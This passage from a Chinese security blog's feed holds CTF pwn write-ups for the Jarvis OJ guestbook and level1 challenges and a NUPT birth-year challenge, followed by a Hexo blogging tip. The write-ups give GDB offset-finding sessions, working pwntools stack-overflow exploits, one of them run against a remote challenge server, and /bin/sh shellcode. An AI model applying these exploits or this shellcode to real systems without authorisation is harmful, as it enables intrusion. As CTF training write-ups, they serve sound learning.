<h3 id="GDB调试找到溢出偏移"><a href="#GDB调试找到溢出偏移" class="headerlink" title="GDB调试找到溢出偏移"></a>GDB调试找到溢出偏移</h3><p>加载程序 并尝试运行程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ file guestbook</div><div class="line">Reading symbols from guestbook...(no debugging symbols found)...done.</div><div class="line">gdb-peda$ pattern create 300</div><div class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span></div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ r</div><div class="line">Starting program: /home/ios/Desktop/guestbook AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">Input your message:</div><div class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</div><div class="line">I have received your message, Thank you!</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x29 (<span class="string">')'</span>)</div><div class="line">RBX: 0x0 </div><div class="line">RCX: 0x7ffff7b042c0 (&lt;__write_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</div><div class="line">RDX: 0x29 (<span class="string">')'</span>)</div><div class="line">RSI: 0x400738 (<span class="string">"I have received your message, Thank you!\n"</span>)</div><div class="line">RDI: 0x1 </div><div class="line">RBP: 0x400690 (&lt;__libc_csu_init&gt;:	push   r15)</div><div class="line">RSP: 0x7fffffffde28 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">RIP: 0x400525 (&lt;main+69&gt;:	ret)</div><div class="line">R8 : 0x400700 (&lt;__libc_csu_fini&gt;:	repz ret)</div><div class="line">R9 : 0x7ffff7de7ab0 (&lt;_dl_fini&gt;:	push   rbp)</div><div class="line">R10: 0x37b </div><div class="line">R11: 0x246 </div><div class="line">R12: 0x400526 (&lt;_start&gt;:	xor    ebp,ebp)</div><div class="line">R13: 0x7fffffffdf00 --&gt; 0x2 </div><div class="line">R14: 0x0 </div><div class="line">R15: 0x0</div><div class="line">EFLAGS: 0x10206 (carry PARITY adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x400514 &lt;main+52&gt;:	mov    edi,0x1</div><div class="line">   0x400519 &lt;main+57&gt;:	call   0x400480 &lt;write@plt&gt;</div><div class="line">   0x40051e &lt;main+62&gt;:	add    rsp,0x88</div><div class="line">=&gt; 0x400525 &lt;main+69&gt;:	ret    </div><div class="line">   0x400526 &lt;_start&gt;:	xor    ebp,ebp</div><div class="line">   0x400528 &lt;_start+2&gt;:	mov    r9,rdx</div><div class="line">   0x40052b &lt;_start+5&gt;:	pop    rsi</div><div class="line">   0x40052c &lt;_start+6&gt;:	mov    rdx,rsp</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffde28 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0008| 0x7fffffffde30 (<span class="string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0016| 0x7fffffffde38 (<span class="string">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0024| 0x7fffffffde40 (<span class="string">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0032| 0x7fffffffde48 (<span class="string">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0040| 0x7fffffffde50 (<span class="string">"AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0048| 0x7fffffffde58 (<span class="string">"AAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">0056| 0x7fffffffde60 (<span class="string">"ZAAxAAyAAzA%%A%sA%BA%<span class="variable">$A</span>%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x0000000000400525 <span class="keyword">in</span> main ()</div></pre></td></tr></table></figure>
<p>发现错误停止在了 main函数 的ret处<br>接下来计算缓冲区的大小<br>由于程序使用的内存地址不能大于0x00007fffffffffff，PC指针并没有指向类似于0x41414141那样地址，但是ret指令等于pop rip，可以通过查看栈顶指针的值确定下一步程序运行的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx $rsp</div><div class="line">0x7fffffffde28:	0x41416d4141514141</div><div class="line">gdb-peda$ pattern offset 0x41416d4141514141</div><div class="line">4702159612987654465 found at offset: 136</div></pre></td></tr></table></figure></p>
<p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。<br>得到偏移为136 所以我们就可以构造exp了</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./guestbook')</span></div><div class="line">p = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9876</span>)</div><div class="line">payload = <span class="string">'A'</span>*<span class="number">136</span> + p64(<span class="number">0x400620</span>)</div><div class="line">p.recvuntil(<span class="string">'Input your message:\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line"><span class="keyword">print</span> p.recv()</div></pre></td></tr></table></figure>
<p>运行测试一下<br><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/6.jpg" alt="ida1"><br>成功拿到flag</p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec level1</div><div class="line">[*] <span class="string">'/home/ios/level1'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x8048000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
<p>啥都没开2333<br>载入IDA分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>发现 read 直接读了buf 存在漏洞<br>利用思路 覆盖溢出buf 写入shellcode 起shell<br>生成shellcode方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</div><div class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</div><div class="line">shellcode=asm(shellcraft.sh())</div></pre></td></tr></table></figure></p>
<p>或者使用已经生成好的shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shellcode = <span class="string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span></div></pre></td></tr></table></figure></p>
<p>最终利用exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(&apos;./level1&apos;)</div><div class="line">shellcode = &quot;\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34&quot;</div><div class="line">ret = p.recvuntil(&apos;?&apos;,drop=True)</div><div class="line">ret = int(ret[12:],16)</div><div class="line">print hex(ret)</div><div class="line">payload = shellcode + &apos;a&apos;*(0x88-len(shellcode)) +&apos;bbbb&apos;+p32(ret)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/7.jpg" alt="ida1"><br>成功拿到shell </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此篇记录关于Jarvis OJ Pwn所有题目的writeup&lt;/p&gt;
&lt;h2 id=&quot;XMAN-level0&quot;&gt;&lt;a href=&quot;#XMAN-level0&quot; class=&quot;headerlink&quot; title=&quot;[XMAN]level0&quot;&gt;&lt;/a&gt;[XMAN]level0&lt;/h2&gt;&lt;h4 id=&quot;进行chack&quot;&gt;&lt;a href=&quot;#进行chack&quot; class=&quot;headerlink&quot; title=&quot;进行chack&quot;&gt;&lt;/a&gt;进行chack&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[*] &lt;span class=&quot;string&quot;&gt;&#39;/home/ios/Desktop/pwn0&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Arch:     amd64-64-little&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RELRO:    No RELRO&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Stack:    No canary found&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NX:       NX enabled&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    PIE:      No PIE (0x400000)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="Jarvis OJ" scheme="http://iosmosis.github.io/tags/Jarvis-OJ/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>When Did You Born</title>
    <link href="http://iosmosis.github.io/2018/03/21/When-Did-You-Born/"/>
    <id>http://iosmosis.github.io/2018/03/21/When-Did-You-Born/</id>
    <published>2018-03-21T02:49:50.000Z</published>
    <updated>2018-03-21T03:25:20.219Z</updated>
    
    <content type="html"><![CDATA[<p>南邮CTF的一道简单pwn100题目</p>
<p><img src="/2018/03/21/When-Did-You-Born/1.jpg" alt="题目信息"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h4 id="题目提供了源文件-可以看下代码了解流程"><a href="#题目提供了源文件-可以看下代码了解流程" class="headerlink" title="题目提供了源文件 可以看下代码了解流程"></a>题目提供了源文件 可以看下代码了解流程</h4></the></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> Student &#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</div><div class="line">    <span class="keyword">int</span> birth;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">struct</span> Student student;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"What\'s Your Birth?\n"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;student.birth);</div><div class="line">    <span class="keyword">while</span> (getchar() != <span class="string">'\n'</span>) ;</div><div class="line">    <span class="keyword">if</span> (student.birth == <span class="number">1926</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Cannot Born In 1926!\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"What\'s Your Name?\n"</span>);</div><div class="line">    gets(student.name);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, student.birth);</div><div class="line">    <span class="keyword">if</span> (student.birth == <span class="number">1926</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Shall Have Flag.\n"</span>);</div><div class="line">        system(<span class="string">"cat flag"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Are Naive.\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Speed One Second Here.\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="主要流程再讲得输入一个birth-如果birth-1926就能getflag-但是直接输入1926就结束程序"><a href="#主要流程再讲得输入一个birth-如果birth-1926就能getflag-但是直接输入1926就结束程序" class="headerlink" title="主要流程再讲得输入一个birth 如果birth=1926就能getflag 但是直接输入1926就结束程序"></a>主要流程再讲得输入一个birth 如果birth=1926就能getflag 但是直接输入1926就结束程序</h4><h4 id="可以很容易的发现gets函数没有做任何限制"><a href="#可以很容易的发现gets函数没有做任何限制" class="headerlink" title="可以很容易的发现gets函数没有做任何限制"></a>可以很容易的发现gets函数没有做任何限制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec <span class="built_in">test</span></div><div class="line">[*] <span class="string">'/home/ios/test'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
<h4 id="栈溢出保护开启-NX开启"><a href="#栈溢出保护开启-NX开启" class="headerlink" title="栈溢出保护开启 NX开启"></a>栈溢出保护开启 NX开启</h4><h4 id="使用objdump-S-test-M-intel-来查看相关汇编指令"><a href="#使用objdump-S-test-M-intel-来查看相关汇编指令" class="headerlink" title="使用objdump -S test -M intel 来查看相关汇编指令"></a>使用objdump -S test -M intel 来查看相关汇编指令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">40073e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax</div><div class="line">400742:	31 c0                	xor    eax,eax</div><div class="line">400744:	bf 94 08 40 00       	mov    edi,0x400894</div><div class="line">400749:	e8 62 fe ff ff       	call   4005b0 &lt;puts@plt&gt;</div><div class="line">40074e:	48 8d 45 e0          	lea    rax,[rbp-0x20]</div><div class="line">400752:	48 83 c0 08          	add    rax,0x8</div><div class="line">400756:	48 89 c6             	mov    rsi,rax</div><div class="line">400759:	bf a7 08 40 00       	mov    edi,0x4008a7</div><div class="line">40075e:	b8 00 00 00 00       	mov    eax,0x0</div><div class="line">400763:	e8 c8 fe ff ff       	call   400630 &lt;__isoc99_scanf@plt&gt;</div><div class="line">400768:	90                   	nop</div><div class="line">400769:	e8 92 fe ff ff       	call   400600 &lt;getchar@plt&gt;</div><div class="line">40076e:	83 f8 0a             	cmp    eax,0xa</div><div class="line">400771:	75 f6                	jne    400769 &lt;main+0x3c&gt;</div><div class="line">400773:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]</div><div class="line">400776:	3d 86 07 00 00       	cmp    eax,0x786</div><div class="line">40077b:	75 11                	jne    40078e &lt;main+0x61&gt;</div><div class="line">40077d:	bf aa 08 40 00       	mov    edi,0x4008aa</div><div class="line">400782:	e8 29 fe ff ff       	call   4005b0 &lt;puts@plt&gt;</div><div class="line">400787:	b8 00 00 00 00       	mov    eax,0x0</div><div class="line">40078c:	eb 68                	jmp    4007f6 &lt;main+0xc9&gt;</div><div class="line">40078e:	bf c3 08 40 00       	mov    edi,0x4008c3</div><div class="line">400793:	e8 18 fe ff ff       	call   4005b0 &lt;puts@plt&gt;</div><div class="line">400798:	48 8d 45 e0          	lea    rax,[rbp-0x20]</div></pre></td></tr></table></figure>
<h4 id="可以看出-birth地址位于-rbp-0x20-0x8-而-name地址位于-rbp-0x20"><a href="#可以看出-birth地址位于-rbp-0x20-0x8-而-name地址位于-rbp-0x20" class="headerlink" title="可以看出 .birth地址位于[rbp-0x20+0x8] 而 .name地址位于[rbp-0x20]"></a>可以看出 .birth地址位于[rbp-0x20+0x8] 而 .name地址位于[rbp-0x20]</h4><h4 id="所以在gets函数处输入0x8字节就可以达到-birth地址"><a href="#所以在gets函数处输入0x8字节就可以达到-birth地址" class="headerlink" title="所以在gets函数处输入0x8字节就可以达到.birth地址"></a>所以在gets函数处输入0x8字节就可以达到.birth地址</h4><h4 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./test'</span>)</div><div class="line"></div><div class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">1926</span>)</div><div class="line"></div><div class="line">p.sendline(<span class="string">'ios'</span>)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line"><span class="keyword">print</span> p.recv()</div></pre></td></tr></table></figure>
<h4 id="由于是在本地测试-就自己建了个flag"><a href="#由于是在本地测试-就自己建了个flag" class="headerlink" title="由于是在本地测试 就自己建了个flag"></a>由于是在本地测试 就自己建了个flag</h4><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python test.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./test'</span>: pid 3064</div><div class="line">What<span class="string">'s Your Birth?</span></div><div class="line">What's Your Name?</div><div class="line"></div><div class="line">You Are Born In 1926</div><div class="line">You Shall Have Flag.</div><div class="line"></div><div class="line">[*] Stopped process <span class="string">'./test'</span> (pid 3064)</div><div class="line">ios@ubuntu:~$ python test.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./test'</span>: pid 3078</div><div class="line">What<span class="string">'s Your Birth?</span></div><div class="line">What's Your Name?</div><div class="line"></div><div class="line">You Are Born In 1926</div><div class="line">You Shall Have Flag.</div><div class="line"></div><div class="line">oh! you get this flag!</div><div class="line"></div><div class="line">[*] Process <span class="string">'./test'</span> stopped with <span class="built_in">exit</span> code 0 (pid 3078)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;南邮CTF的一道简单pwn100题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2018/03/21/When-Did-You-Born/1.jpg&quot; alt=&quot;题目信息&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="南邮CTF" scheme="http://iosmosis.github.io/tags/%E5%8D%97%E9%82%AECTF/"/>
    
  </entry>
  
  <entry>
    <title>关于hexo添加图片的问题</title>
    <link href="http://iosmosis.github.io/2018/03/20/hexofix/"/>
    <id>http://iosmosis.github.io/2018/03/20/hexofix/</id>
    <published>2018-03-20T15:37:28.000Z</published>
    <updated>2018-03-20T17:05:32.853Z</updated>
    
    <content type="html"><![CDATA[<p>解决了关于hexo文章内部引用图片的问题</p>
<h4 id="找到你建立的hexo网站的主页配置文件-“-config-yml”"><a href="#找到你建立的hexo网站的主页配置文件-“-config-yml”" class="headerlink" title="找到你建立的hexo网站的主页配置文件 “_config.yml”"></a>找到你建立的hexo网站的主页配置文件 “_config.yml”</h4><p><img src="/2018/03/20/hexofix/2.jpg" alt="主页配置文件"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h4 id="打开配置文件-找到“post-asset-folder-这个选项设置为true”"><a href="#打开配置文件-找到“post-asset-folder-这个选项设置为true”" class="headerlink" title="打开配置文件 找到“post_asset_folder:这个选项设置为true”"></a>打开配置文件 找到“post_asset_folder:这个选项设置为true”</h4><img src="/2018/03/20/hexofix/3.jpg" alt="修改文件"></the></li>
</ul>
<h4 id="打开终端-进入hexo安装目录-并用npm安装image上传插件"><a href="#打开终端-进入hexo安装目录-并用npm安装image上传插件" class="headerlink" title="打开终端 进入hexo安装目录 并用npm安装image上传插件"></a>打开终端 进入hexo安装目录 并用npm安装image上传插件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-asset-image --save</div></pre></td></tr></table></figure>
<p><img src="/2018/03/20/hexofix/4.jpg" alt="bash"></p>
<h4 id="安装完成后-可以尝试一下-重新创建一篇文章"><a href="#安装完成后-可以尝试一下-重新创建一篇文章" class="headerlink" title="安装完成后 可以尝试一下 重新创建一篇文章"></a>安装完成后 可以尝试一下 重新创建一篇文章</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo n <span class="string">"test"</span></div></pre></td></tr></table></figure>
<h4 id="执行完毕-可以看到-posts目录不仅创建了test-md还创建了一个test目录"><a href="#执行完毕-可以看到-posts目录不仅创建了test-md还创建了一个test目录" class="headerlink" title="执行完毕 可以看到 _posts目录不仅创建了test.md还创建了一个test目录"></a>执行完毕 可以看到 _posts目录不仅创建了test.md还创建了一个test目录</h4><p><img src="/2018/03/20/hexofix/5.jpg" alt="目录"></p>
<h4 id="在test目录里添加你需要的图片就可以了-并且使用markdown图片引用即可"><a href="#在test目录里添加你需要的图片就可以了-并且使用markdown图片引用即可" class="headerlink" title="在test目录里添加你需要的图片就可以了 并且使用markdown图片引用即可"></a>在test目录里添加你需要的图片就可以了 并且使用markdown图片引用即可</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用命令</span></div><div class="line">![图片名称](xx/xxx.jpg) <span class="comment">#xx代表创建文章时同时创建的文件夹 本文应该为test xxx.jpg就是存放在目录里面的图片名称了</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
